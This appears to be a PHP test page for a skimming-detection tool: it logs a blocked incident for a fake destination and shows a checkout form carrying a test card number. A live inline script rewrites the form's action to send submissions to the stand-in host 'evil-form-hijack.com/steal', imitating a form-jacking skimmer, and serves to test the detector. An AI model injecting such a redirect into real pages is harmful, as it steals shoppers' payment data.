<?php
require_once __DIR__ . '/includes/db.php';
require_once __DIR__ . '/includes/auth.php';
require_once __DIR__ . '/includes/settings.php';
require_once __DIR__ . '/includes/detector.php';
requireLogin();

$hijackedDestination = 'evil-form-hijack.com';
$allowed = isDestinationAllowed($hijackedDestination);

if (!$allowed) {
    $scriptId = ensureScriptRecord('form-hijack-loader.js', 'n/a', 'n/a', 'unknown', 'blocked');
    logIncident($scriptId, 'unauthorised_post', 'form-hijack-loader.js', $hijackedDestination, 'critical', 'blocked');
}
?>
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Real Form Hijack Test</title></head>
<body>
<h2>Real Form Hijack Test</h2>
<form id="checkoutForm" action="/mads-v2/process_payment.php" method="POST">
    <input type="text" name="card_number" value="4111111111111111">
    <button type="submit">Complete Purchase</button>
</form>

<script>
// Real, live DOM manipulation -- a malicious script actually hijacking the form's action
document.getElementById('checkoutForm').action = 'https://evil-form-hijack.com/steal';
console.log('Form action hijacked to:', document.getElementById('checkoutForm').action);
</script>

<p style="color:red;">
<?= $allowed ? 'Destination allowed -- no incident logged.' : 'BLOCKED -- unauthorized destination detected. A real incident was logged and an alert email should be sent.' ?>
</p>
</body>
</html>